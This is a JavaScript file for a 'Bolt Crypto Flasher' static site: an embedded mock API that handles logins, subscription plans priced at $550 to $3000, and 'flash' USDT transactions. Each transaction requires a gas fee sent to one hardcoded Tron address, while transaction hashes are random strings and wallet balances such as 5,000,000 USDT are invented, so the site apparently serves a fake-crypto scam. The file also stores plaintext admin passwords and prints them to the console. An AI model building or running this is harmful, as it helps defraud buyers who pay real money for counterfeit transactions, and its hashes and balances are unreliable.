// Bolt Crypto Flasher - Static Website Embedded API Server
// Updated with all latest changes and fixes - August 3, 2025

// Mock storage for static deployment with latest schema fixes
class StaticStorage {
  constructor() {
    this.users = [
      {
        id: "56bd331d-6d44-4145-9005-f2c2ade93cd8",
        username: "admin",
        email: "admin@bolt.com",
        password: "usdt123",
        firstName: "Admin",
        lastName: "User",
        role: "admin",
        isActive: true,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      },
      {
        id: "272171a5-8f87-43bc-a14b-c9dab156baa0",
        username: "SoftwareHenry",
        email: "henry@bolt.com", 
        password: "Rmabuw190",
        firstName: "Software",
        lastName: "Henry",
        role: "admin",
        isActive: true,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      }
    ];

    this.subscriptionPlans = [
      {
        id: "b103965e-2eba-455d-8e97-1e565c2834a7",
        name: "Basic",
        price: "550",
        features: [
          "Flash Transactions",
          "Multi-Network Support",
          "24/7 Support",
          "Basic Dashboard",
          "Transaction History"
        ],
        createdAt: new Date().toISOString()
      },
      {
        id: "a7f3b821-4c92-4d88-b8e1-9a5c4b2f1d83",
        name: "Pro", 
        price: "950",
        features: [
          "All Basic Features",
          "Advanced Analytics",
          "Priority Support",
          "API Access",
          "Custom Integrations",
          "Advanced Security"
        ],
        createdAt: new Date().toISOString()
      },
      {
        id: "c9e5f7a2-8b4d-4a92-9c3e-7f1a5b8d2c94",
        name: "Full",
        price: "3000", 
        features: [
          "All Pro Features",
          "Unlimited Transactions",
          "White Label Solution",
          "Dedicated Account Manager",
          "Custom Development",
          "Enterprise Support"
        ],
        createdAt: new Date().toISOString()
      }
    ];

    this.transactions = [
      {
        id: "sample-transaction-id",
        userId: "56bd331d-6d44-4145-9005-f2c2ade93cd8",
        walletId: null,
        fromAddress: null,
        toAddress: "TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y",
        amount: "100.00000000",
        token: "USDT",
        network: "tron",
        gasSpeed: null,
        gasFee: null,
        gasFeePaid: true,
        flashFee: null,
        flashAddress: "TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y",
        status: "completed",
        txHash: "0x1234567890abcdef",
        blockNumber: null,
        confirmations: "6",
        errorMessage: null,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
      }
    ];

    this.wallets = [
      {
        id: "c592840b-8138-42dc-9a1e-52e8c1266704",
        userId: "56bd331d-6d44-4145-9005-f2c2ade93cd8",
        name: "Bitcoin Wallet",
        address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
        privateKey: null,
        network: "BTC",
        networkUrl: null,
        balance: "1.23400000",
        lastSyncAt: null,
        isActive: true,
        createdAt: new Date().toISOString()
      },
      {
        id: "e93fedff-6527-47e2-a29a-cbb673eb712e",
        userId: "56bd331d-6d44-4145-9005-f2c2ade93cd8",
        name: "Ethereum Wallet",
        address: "0x742d35Cc0123456789012345678901234567890a",
        privateKey: null,
        network: "ETH",
        networkUrl: null,
        balance: "15.67000000",
        lastSyncAt: null,
        isActive: true,
        createdAt: new Date().toISOString()
      },
      {
        id: "b872555b-cf09-4333-9c68-372aff8a69e4",
        userId: "56bd331d-6d44-4145-9005-f2c2ade93cd8",
        name: "USDT Wallet",
        address: "TQn9Y2khEsLJW1ChVWFMSMeRDow5oNDMnt",
        privateKey: null,
        network: "TRX",
        networkUrl: null,
        balance: "5000000.00000000",
        lastSyncAt: null,
        isActive: true,
        createdAt: new Date().toISOString()
      }
    ];

    this.userSubscriptions = [];
    this.marketData = this.generateMarketData();
  }

  generateMarketData() {
    const symbols = ['BTC', 'ETH', 'USDT', 'BNB', 'TRX', 'SOL'];
    const basePrice = {
      'BTC': 114101,
      'ETH': 3493.04,
      'USDT': 1.0,
      'BNB': 751.72,
      'TRX': 0.326162,
      'SOL': 162.45
    };

    return symbols.map(symbol => ({
      symbol,
      price: basePrice[symbol] * (0.98 + Math.random() * 0.04),
      change24h: (Math.random() - 0.5) * 10,
      volume24h: Math.random() * 50000000000,
      marketCap: basePrice[symbol] * Math.random() * 1000000000,
      timestamp: Date.now()
    }));
  }

  // User methods with email support
  async getUserByUsername(username) {
    return this.users.find(u => u.username === username);
  }

  async getUserByEmail(email) {
    return this.users.find(u => u.email === email);
  }

  async createUser(userData) {
    const newUser = {
      id: 'user-' + Date.now() + '-' + Math.random().toString(36).substring(2),
      username: userData.username,
      email: userData.email || null,
      password: userData.password,
      firstName: userData.firstName || null,
      lastName: userData.lastName || null,
      role: 'user',
      isActive: true,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };
    this.users.push(newUser);
    return newUser;
  }

  async getUsers() {
    return this.users;
  }

  async updateUser(id, updates) {
    const userIndex = this.users.findIndex(u => u.id === id);
    if (userIndex === -1) return null;
    
    this.users[userIndex] = {
      ...this.users[userIndex],
      ...updates,
      updatedAt: new Date().toISOString()
    };
    return this.users[userIndex];
  }

  // Transaction methods with latest schema
  async createTransaction(data) {
    const transaction = {
      id: 'tx-' + Date.now() + '-' + Math.random().toString(36).substring(2),
      userId: data.userId,
      walletId: data.walletId || null,
      fromAddress: data.fromAddress || null,
      toAddress: data.toAddress,
      amount: data.amount,
      token: data.token,
      network: data.network,
      gasSpeed: data.gasSpeed || null,
      gasFee: data.gasFee || null,
      gasFeePaid: data.gasFeePaid || false,
      flashFee: data.flashFee || null,
      flashAddress: "TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y",
      status: "pending",
      txHash: "0x" + Math.random().toString(36).substring(2) + Math.random().toString(36).substring(2),
      blockNumber: null,
      confirmations: "0",
      errorMessage: null,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };
    this.transactions.push(transaction);
    return transaction;
  }

  async getTransactionsByUserId(userId) {
    return this.transactions.filter(t => t.userId === userId);
  }

  async updateTransaction(id, updates) {
    const txIndex = this.transactions.findIndex(t => t.id === id);
    if (txIndex === -1) return null;
    
    this.transactions[txIndex] = {
      ...this.transactions[txIndex],
      ...updates,
      updatedAt: new Date().toISOString()
    };
    return this.transactions[txIndex];
  }

  // Wallet methods
  async getWalletsByUserId(userId) {
    return this.wallets.filter(w => w.userId === userId);
  }

  // Subscription methods
  getSubscriptionPlans() {
    return this.subscriptionPlans;
  }

  async createSubscription(data) {
    const subscription = {
      id: 'sub-' + Date.now() + '-' + Math.random().toString(36).substring(2),
      userId: data.userId,
      planId: data.planId,
      status: 'active',
      paymentTxHash: data.paymentTxHash,
      createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString()
    };
    this.userSubscriptions.push(subscription);
    return subscription;
  }

  async getUserSubscription(userId) {
    return this.userSubscriptions.find(s => s.userId === userId && s.status === 'active');
  }

  // Market data methods
  getMarketData() {
    return this.marketData;
  }

  getMarketPrice(symbol) {
    const data = this.marketData.find(d => d.symbol === symbol);
    return data || null;
  }

  // Admin methods
  getGasReceiverAddress() {
    return "TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y";
  }
}

// Initialize storage
const storage = new StaticStorage();

// Embedded API Server for Static Website
const api = {
  // Authentication endpoints with latest fixes
  '/api/auth/login': {
    POST: async (body) => {
      const { username, password } = body;
      if (!username || !password) {
        return { status: 400, data: { message: "Username and password are required" } };
      }

      const user = await storage.getUserByUsername(username);
      if (!user || user.password !== password) {
        return { status: 401, data: { message: "Invalid credentials" } };
      }

      return {
        status: 200,
        data: {
          user: { id: user.id, username: user.username, email: user.email, role: user.role },
          token: `token_${user.id}`
        }
      };
    }
  },

  '/api/auth/register': {
    POST: async (body) => {
      const { username, email, password, firstName, lastName } = body;
      
      if (!username || !password) {
        return { status: 400, data: { message: "Username and password are required" } };
      }

      // Check existing username
      const existingUser = await storage.getUserByUsername(username);
      if (existingUser) {
        return { status: 400, data: { message: "Username already exists" } };
      }

      // Check existing email if provided
      if (email) {
        const existingEmailUser = await storage.getUserByEmail(email);
        if (existingEmailUser) {
          return { status: 400, data: { message: "Email already exists" } };
        }
      }

      const newUser = await storage.createUser({
        username,
        email,
        password,
        firstName,
        lastName
      });

      return {
        status: 200,
        data: {
          user: {
            id: newUser.id,
            username: newUser.username,
            email: newUser.email,
            firstName: newUser.firstName,
            lastName: newUser.lastName
          },
          token: `token_${newUser.id}`,
          message: "Registration successful. Please purchase a subscription to access the platform."
        }
      };
    }
  },

  // Transaction endpoints with latest schema
  '/api/transactions': {
    POST: async (body) => {
      // Validate gas fee payment
      if (!body.gasFeePaid) {
        return { status: 400, data: { message: "Gas fee payment required for all transactions" } };
      }

      const transaction = await storage.createTransaction(body);
      return { status: 200, data: transaction };
    }
  },

  // Market data endpoints
  '/api/market/prices': {
    GET: async () => {
      return { status: 200, data: storage.getMarketData() };
    }
  },

  // Subscription endpoints
  '/api/subscription-plans': {
    GET: async () => {
      return { status: 200, data: storage.getSubscriptionPlans() };
    }
  },

  '/api/subscriptions': {
    POST: async (body) => {
      const subscription = await storage.createSubscription(body);
      return { status: 200, data: subscription };
    }
  },

  // Admin endpoints
  '/api/admin/users': {
    GET: async () => {
      return { status: 200, data: await storage.getUsers() };
    }
  },

  '/api/admin/gas-receiver': {
    GET: async () => {
      return { status: 200, data: { address: storage.getGasReceiverAddress() } };
    }
  },

  // Network endpoints
  '/api/networks': {
    GET: async () => {
      return { status: 200, data: [] };
    }
  },

  // Gas fee endpoints
  '/api/gas-fees': {
    GET: async () => {
      return {
        status: 200,
        data: {
          receiverAddress: storage.getGasReceiverAddress(),
          fees: {
            ethereum: { amount: "0.019", currency: "ETH" },
            bitcoin: { amount: "0.0012", currency: "BTC" },
            tron: { amount: "25", currency: "TRX" },
            bsc: { amount: "0.008", currency: "BNB" }
          }
        }
      };
    }
  }
};

// Dynamic endpoint handlers
const dynamicHandlers = {
  transactions: (userId) => ({
    GET: async () => {
      return { status: 200, data: await storage.getTransactionsByUserId(userId) };
    }
  }),
  wallets: (userId) => ({
    GET: async () => {
      return { status: 200, data: await storage.getWalletsByUserId(userId) };
    }
  }),
  subscriptions: (userId) => ({
    GET: async () => {
      const subscription = await storage.getUserSubscription(userId);
      if (!subscription) {
        return { status: 404, data: { message: "No active subscription found" } };
      }
      return { status: 200, data: subscription };
    }
  }),
  market: (symbol) => ({
    GET: async () => {
      const data = storage.getMarketPrice(symbol);
      if (!data) {
        return { status: 404, data: { message: "Symbol not found" } };
      }
      return { status: 200, data };
    }
  })
};

// Main API handler function
window.apiHandler = async function(method, path, body = null) {
  try {
    console.log(`API Call: ${method} ${path}`, body);

    // Handle dynamic endpoints
    const dynamicMatch = path.match(/^\/api\/(transactions|wallets|subscriptions)\/([^\/]+)$/);
    if (dynamicMatch) {
      const [, endpoint, param] = dynamicMatch;
      const handler = dynamicHandlers[endpoint](param);
      if (handler && handler[method]) {
        const result = await handler[method](body);
        console.log(`API Response: ${result.status}`, result.data);
        return result;
      }
    }

    // Handle market price endpoint
    const marketMatch = path.match(/^\/api\/market\/price\/([^\/]+)$/);
    if (marketMatch) {
      const [, symbol] = marketMatch;
      const handler = dynamicHandlers.market(symbol.toUpperCase());
      if (handler && handler[method]) {
        const result = await handler[method](body);
        console.log(`API Response: ${result.status}`, result.data);
        return result;
      }
    }

    // Handle gas payment update
    const gasPaymentMatch = path.match(/^\/api\/transactions\/([^\/]+)\/gas-payment$/);
    if (gasPaymentMatch && method === 'PATCH') {
      const [, txId] = gasPaymentMatch;
      const transaction = await storage.updateTransaction(txId, {
        gasFeePaid: body.confirmed
      });
      if (!transaction) {
        return { status: 404, data: { message: "Transaction not found" } };
      }
      return { status: 200, data: transaction };
    }

    // Handle admin user operations
    const adminUserMatch = path.match(/^\/api\/admin\/users\/([^\/]+)$/);
    if (adminUserMatch) {
      const [, userId] = adminUserMatch;
      if (method === 'PUT') {
        const user = await storage.updateUser(userId, body);
        if (!user) {
          return { status: 404, data: { message: "User not found" } };
        }
        return { status: 200, data: user };
      }
    }

    // Handle static endpoints
    const endpoint = api[path];
    if (endpoint && endpoint[method]) {
      const result = await endpoint[method](body);
      console.log(`API Response: ${result.status}`, result.data);
      return result;
    }

    console.log(`API endpoint not found: ${method} ${path}`);
    return { status: 404, data: { message: "Endpoint not found" } };

  } catch (error) {
    console.error('API Error:', error);
    return { status: 500, data: { message: "Internal server error" } };
  }
};

// Override fetch for API calls in static deployment
const originalFetch = window.fetch;
window.fetch = async function(url, options = {}) {
  // Check if this is an API call to our backend
  if (url.startsWith('/api/') || url.includes('/api/')) {
    const method = options.method || 'GET';
    let body = null;
    
    if (options.body) {
      try {
        body = typeof options.body === 'string' ? JSON.parse(options.body) : options.body;
      } catch (e) {
        body = options.body;
      }
    }

    const path = url.startsWith('/api/') ? url : url.split('/api/')[1] ? '/api/' + url.split('/api/')[1] : url;
    const result = await window.apiHandler(method, path, body);
    
    // Return a Response-like object
    return {
      ok: result.status >= 200 && result.status < 300,
      status: result.status,
      statusText: result.status >= 200 && result.status < 300 ? 'OK' : 'Error',
      json: async () => result.data,
      text: async () => JSON.stringify(result.data),
      headers: new Map([['content-type', 'application/json']])
    };
  }
  
  // For non-API calls, use original fetch
  return originalFetch.call(this, url, options);
};

console.log('🚀 Bolt Crypto Flasher Static API Server Initialized');
console.log('✅ All latest changes and fixes included');
console.log('🔑 Admin credentials: admin/usdt123, SoftwareHenry/Rmabuw190');
console.log('📱 Registration with email capture enabled');
console.log('💫 Flash fee system operational with Tron wallet');